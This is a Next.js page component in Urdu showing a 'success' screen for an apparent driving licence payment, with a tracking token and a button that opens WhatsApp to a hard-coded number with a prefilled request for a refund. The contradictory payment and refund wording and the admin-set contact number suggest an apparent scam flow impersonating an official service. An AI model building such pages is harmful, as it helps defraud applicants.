"use client";
import { useRouter, useSearchParams } from "next/navigation";
import { Suspense } from "react";

function FinalSuccessContent() {
  const router = useRouter();
  const searchParams = useSearchParams();

  const name = searchParams.get("name") || "";
  const token = searchParams.get("token") || "";
  const amount = searchParams.get("amount") || "5000";

  // ✅ WhatsApp number admin panel se aayega
  const whatsapp =
    typeof window !== "undefined"
      ? localStorage.getItem("whatsappNumber") || "923020164923"
      : "923020164923";

  const handleWhatsAppRedirect = () => {
    const message = encodeURIComponent(
      `مبارک ہو! میں نے اپنی ڈرائیونگ لائسنس کی درخواست مکمل کر لی ہے۔\n\nٹوکن نمبر: ${token}\nرقم: ${amount} روپے\n\nبراہ کرم رقم واپس کر دیں۔`
    );
    window.open(`https://wa.me/${whatsapp}?text=${message}`, "_blank");
  };

  return (
    <main className="min-h-screen bg-gradient-to-br from-green-50 to-white flex items-center justify-center px-3 py-6">
      <div className="w-full max-w-md sm:max-w-xl">

        <div className="bg-white rounded-2xl shadow-xl overflow-hidden">

          {/* Header */}
          <div className="bg-gradient-to-r from-green-600 to-green-700 p-5 text-center">
            <div className="flex justify-center mb-3">
              <div className="w-16 h-16 bg-white rounded-full flex items-center justify-center shadow">
                <svg className="w-9 h-9 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                </svg>
              </div>
            </div>

            <h1 className="text-2xl font-bold text-white" dir="rtl">
              مبارک ہو!
            </h1>
            <p className="text-white text-sm mt-1" dir="rtl">
              {name} صاحب
            </p>
            <p className="text-green-100 text-xs mt-1" dir="rtl">
              آپ کا پروسیس کامیابی سے مکمل ہو گیا ہے
            </p>
          </div>

          {/* Body */}
          <div className="p-4 space-y-4">

            <div className="bg-green-50 border border-green-500 rounded-xl p-4 text-center">
              <p className="text-xs font-semibold text-gray-600 uppercase mb-1">
                TCS Tracking ID
              </p>
              <p className="text-2xl font-extrabold text-green-600 break-all">
                {token}
              </p>
            </div>

            <div className="border rounded-xl p-4 text-sm text-gray-800 leading-relaxed" dir="rtl">
  معزز <span className="font-bold">{name}</span>،  
  <br /><br />
  السلام علیکم،  
  <br /><br />
  میں نے ڈرائیونگ لائسنس کے لیے درخواست جمع کروائی ہے اور اس کی متعلقہ ادائیگی بھی مکمل کر دی ہے۔  
  براہِ مہربانی میری ادائیگی کی تصدیق کرنے کے بعد مجھے آگاہ فرما دیں کہ میرا لائسنس کب تک تیار ہو جائے گا۔  
  <br /><br />
  شکریہ  
  <br /><br />
  <span className="font-bold text-green-600">{amount} روپے</span> کی ادائیگی بھی مکمل کر دی گئی ہے۔
</div>


            <button
              onClick={handleWhatsAppRedirect}
              className="w-full flex items-center justify-center gap-2 bg-green-600 hover:bg-green-700 text-white py-4 rounded-full text-base font-bold"
            >
              WhatsApp پر رقم حاصل کریں
            </button>

            <button
              onClick={() => router.push("/")}
              className="w-full py-3 rounded-full bg-gray-100 text-gray-700 text-sm font-semibold"
            >
              ← ہوم پیج پر واپس جائیں
            </button>

          </div>
        </div>

        <p className="text-center text-xs text-gray-500 mt-4" dir="rtl">
          ٹوکن نمبر محفوظ رکھیں
        </p>

      </div>
    </main>
  );
}

export default function FinalSuccessPage() {
  return (
    <Suspense fallback={<div className="min-h-screen flex items-center justify-center">Loading...</div>}>
      <FinalSuccessContent />
    </Suspense>
  );
}
